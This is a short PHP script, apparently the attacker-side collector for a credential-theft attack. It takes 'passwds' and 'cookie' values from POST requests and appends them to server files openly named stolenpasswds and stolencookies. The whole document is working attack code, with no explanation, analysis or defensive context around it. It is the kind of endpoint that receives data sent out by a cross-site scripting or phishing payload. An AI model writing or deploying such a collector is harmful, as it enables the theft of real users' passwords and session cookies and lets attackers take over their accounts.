<?php
	$f1 = fopen("/var/www/stolenpasswds", "a+");
  	fwrite($f1, $_POST['passwds'] . "\n");
  	fclose($f1);
  	$f = fopen("/var/www/stolencookies", "a+");
  	fwrite($f, $_POST['cookie'] . "\n");
  	fclose($f);

?>
